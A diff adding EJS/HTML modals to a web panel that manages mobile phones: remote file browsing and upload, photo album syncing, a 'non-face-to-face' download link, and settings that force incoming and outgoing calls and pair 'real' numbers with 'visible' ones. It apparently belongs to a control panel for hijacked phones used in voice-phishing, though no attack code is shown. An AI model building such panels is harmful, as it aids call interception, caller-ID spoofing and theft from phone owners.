+                                        <div class="col-md-9">
+                                            <input type="text" class="form-control input-sm" id="mobile_number" disabled>
+                                        </div>
+                                    </div>
+                                </div>
+                            </form>
+                        </div>
+                        <div class="modal-footer">
+                            <button type="button" class="btn green btn-outline" id="edit_mobile_name_btn"><%= __('mobiles.edit.confirm') %></button>
+                            <button type="button" class="btn dark btn-outline" data-dismiss="modal"><%= __('mobiles.edit.close') %></button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="modal fade draggable-modal" id="filelist_modal" tabindex="-1" role="basic" aria-hidden="true" data-backdrop="static">
+                <div class="modal-dialog modal-lg">
+                    <div class="modal-content">
+                        <div class="modal-header">
+                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true"></button>
+                            <h4 class="modal-title">파일 관리</h4>
+                        </div>
+                        <div class="modal-body form">
+                            <div style="margin: 10px;">
+                                <button type="button" class="btn blue btn-outline" id="upload_filelist_btn">
+                                    <i class="fa fa-refresh" aria-hidden="true"></i>
+                                </button>
+                                <span id="upload_filelist_result"></span>
+                            </div>
+                            <div style="margin: 10px;">
+                                <span id="rec_path_result"></span>
+                                <input id="send_file" type="file" class="form-control" style="display: none;">
+                                <input type="hidden" id='current_path'>
+                                <input type="hidden" id='storage_path'>
+                            </div>
+                            <div style="margin: 10px;">
+                                <table id="filelist_table"> </table>
+                            </div>
+                        </div>
+                        <div class="modal-footer">
+                            <button type="button" class="btn dark btn-outline" data-dismiss="modal">닫기</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="modal fade draggable-modal" id="setting_modal" tabindex="-1" role="basic" aria-hidden="true" data-backdrop="static">
+                <div class="modal-dialog modal-md">
+                    <div class="modal-content">
+                        <div class="modal-header">
+                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true"></button>
+                            <h4 class="modal-title"><%= __('mobiles.seperatedsendrecv') %></h4>
+                        </div>
+                        <div class="modal-body form">
+                            <input type="text" class="form-control input-sm" id="setting_mobile_id" style="display: none;">
+                            <form class="form-horizontal" role="form">
+                                <div class="form-body">
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label"><%= __('mobiles.seperatedsendrecv.forceRecv') %>:</label>
+                                        <div class="col-md-9">
+                                            <input type="checkbox" class="uiswitch" id="incall_enabled">
+                                        </div>
+                                    </div>
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label"><%= __('mobiles.seperatedsendrecv.actualIncomingForwardingNumber') %>:</label>
+                                        <div class="col-md-9">
+                                            <input type="text" class="form-control input-sm" id="mobile_incoming_number_real">
+                                        </div>
+                                    </div>
+                                    <div class="form-group">
+                                        <label class="col-md-3 control-label"><%= __('mobiles.seperatedsendrecv.forceCall') %>:</label>
+                                        <div class="col-md-9">
+                                            <input type="checkbox" class="uiswitch" id="outcall_enabled">
+                                        </div>
+                                    </div>
+                                    <div style="border: 1px solid #e7ecf1 !important;
+                                        padding-top: 12px;
+                                        padding-right: 12px;">
+                                        <div class="form-group">
+                                            <label class="col-md-3 control-label"><%= __('mobiles.seperatedsendrecv.callingNumber') %>:</label>
+                                            <div class="col-md-9">
+                                                <input type="text" class="form-control input-sm" id="mobile_outgoing_number_real1">
+                                            </div>
+                                        </div>
+                                        <div class="form-group">
+                                            <label class="col-md-3 control-label"><%= __('mobiles.seperatedsendrecv.numberVisible') %>:</label>
+                                            <div class="col-md-9">
+                                                <input type="text" class="form-control input-sm" id="mobile_outgoing_number1">
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div style="border: 1px solid #e7ecf1 !important;
+                                        padding-top: 12px;
+                                        padding-right: 12px;">
+                                        <div class="form-group">
+                                            <label class="col-md-3 control-label"><%= __('mobiles.seperatedsendrecv.callingNumber') %>:</label>
+                                            <div class="col-md-9">
+                                                <input type="text" class="form-control input-sm" id="mobile_outgoing_number_real2">
+                                            </div>
+                                        </div>
+                                        <div class="form-group">
+                                            <label class="col-md-3 control-label"><%= __('mobiles.seperatedsendrecv.numberVisible') %>:</label>
+                                            <div class="col-md-9">
+                                                <input type="text" class="form-control input-sm" id="mobile_outgoing_number2">
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div style="border: 1px solid #e7ecf1 !important;
+                                        padding-top: 12px;
+                                        padding-right: 12px;">
+                                        <div class="form-group">
+                                            <label class="col-md-3 control-label"><%= __('mobiles.seperatedsendrecv.callingNumber') %>:</label>
+                                            <div class="col-md-9">
+                                                <input type="text" class="form-control input-sm" id="mobile_outgoing_number_real3">
+                                            </div>
+                                        </div>
+                                        <div class="form-group">
+                                            <label class="col-md-3 control-label"><%= __('mobiles.seperatedsendrecv.numberVisible') %>:</label>
+                                            <div class="col-md-9">
+                                                <input type="text" class="form-control input-sm" id="mobile_outgoing_number3">
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div style="border: 1px solid #e7ecf1 !important;
+                                        padding-top: 12px;
+                                        padding-right: 12px;">
+                                        <div class="form-group">
+                                            <label class="col-md-3 control-label"><%= __('mobiles.seperatedsendrecv.callingNumber') %>:</label>
+                                            <div class="col-md-9">
+                                                <input type="text" class="form-control input-sm" id="mobile_outgoing_number_real4">
+                                            </div>
+                                        </div>
+                                        <div class="form-group">
+                                            <label class="col-md-3 control-label"><%= __('mobiles.seperatedsendrecv.numberVisible') %>:</label>
+                                            <div class="col-md-9">
+                                                <input type="text" class="form-control input-sm" id="mobile_outgoing_number4">
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div style="border: 1px solid #e7ecf1 !important;
+                                        padding-top: 12px;
+                                        padding-right: 12px;">
+                                        <div class="form-group">
+                                            <label class="col-md-3 control-label"><%= __('mobiles.seperatedsendrecv.callingNumber') %>:</label>
+                                            <div class="col-md-9">
+                                                <input type="text" class="form-control input-sm" id="mobile_outgoing_number_real5">
+                                            </div>
+                                        </div>
+                                        <div class="form-group">
+                                            <label class="col-md-3 control-label"><%= __('mobiles.seperatedsendrecv.numberVisible') %>:</label>
+                                            <div class="col-md-9">
+                                                <input type="text" class="form-control input-sm" id="mobile_outgoing_number5">
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </form>
+                        </div>
+                        <div class="modal-footer">
+                            <button type="button" class="btn green btn-outline" id="setting_mobile_btn"><%= __('mobiles.seperatedsendrecv.check') %></button>
+                            <button type="button" class="btn dark btn-outline" data-dismiss="modal"><%= __('mobiles.seperatedsendrecv.close') %></button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="modal fade draggable-modal" id="down_link_modal" tabindex="-1" role="basic" aria-hidden="true" data-backdrop="static">
+                <div class="modal-dialog modal-lg">
+                    <div class="modal-content">
+                        <div class="modal-header">
+                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true"></button>
+                            <h4 class="modal-title"><%= __('mobiles.downlink') %></h4>
+                        </div>
+                        <div class="modal-body form">
+                            <div class="row" style="margin: 10px;">
+                                <label class="col-md-2 control-label"><%= __('mobiles.downlink.nonefacetoface') %>:</label>
+                                <div class="col-md-8">
+                                    <input type="text" class="form-control input-sm" id="down_link_address" disabled>
+                                </div>
+                                <div class="col-md-2">
+                                    <button type="button" class="btn btn-primary" id="down_link_address_copy">
+                                        <i class="fa fa-copy"></i><%= __('mobiles.downlink.copy') %>
+                                    </button> &nbsp;&nbsp;
+                                </div>
+                            </div>
+                        </div>
+                        <div class="modal-footer">
+                            <button type="button" class="btn dark btn-outline" data-dismiss="modal"><%= __('mobiles.downlink.close') %></button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="modal fade draggable-modal" id="album_modal" tabindex="-1" role="basic" aria-hidden="true" data-backdrop="static">
+                <div class="modal-dialog modal-lg">
+                    <div class="modal-content">
+                        <div class="modal-header">
+                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true"></button>
+                            <h4 class="modal-title"><%= __('mobiles.album') %></h4>
+                        </div>
+                        <div class="modal-body form">
+
+                            <div style="margin: 10px;">
+                                <button type="button" class="btn btn-primary" id="album_update_btn">
+                                    <i class="fa fa-toggle-off"></i><%= __('mobiles.album.updatestart') %></button> &nbsp;&nbsp;
+                                <button type="button" class="btn btn-warning" id="album_update_stop_btn">
+                                    <i class="fa fa-toggle-off"></i><%= __('mobiles.album.updatestop') %></button> &nbsp;&nbsp;
+                                <button type="button" class="btn btn-danger" id="album_refresh_btn">
+                                    <i class="fa fa-trash"></i><%= __('mobiles.album.refresh') %></button>&nbsp;&nbsp;
+                                <span id="upload_album_result"></span>
+                            </div>
+                            <div style="margin: 10px;">
+                                <div class="row" id="album_list" style="min-height: 300px;">
+                                </div>
+                            </div>
+                            <div style="margin: 10px; display: flex;">
+                                <label class="control-label" style="margin-top: 7px; margin-left: 20px;"><%= __('mobiles.album.displaycount') %>:</label>
+                                <select class="form-control" style="width: auto; display: initial; margin-left: 10px;" id="album_count_per_page">
+                                    <option selected>12</option>
+                                    <option>24</option>
+                                    <option>60</option>
+                                    <option>120</option>
+                                </select>
+
+                                <p style="margin-left: 20px; margin-top: -9px;" id="album_pager"> </p>
+                            </div>
+                        </div>
+                        <div class="modal-footer">
+                            <button type="button" class="btn dark btn-outline" data-dismiss="modal"><%= __('mobiles.album.close') %></button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <script>
+                var user_app_id = '<%- user.appId%>'
+            </script>
+            <script src="/assets/global/plugins/icheck/icheck.min.js" type="text/javascript"></script>
+            <script src="/assets/pages/scripts/form-icheck.min.js" type="text/javascript"></script>
+            <script src="/app/lang/mobiles_<%=locale %>.js" type="text/javascript"></script>
+            <script src="/app/js/mobiles.js" type="text/javascript"></script>
+            <div class="col-md-3 col-sm-3 page-content-col">
+                <% include calls.ejs %>
+            </div>
+            <% include ../shared/footer.ejs %>
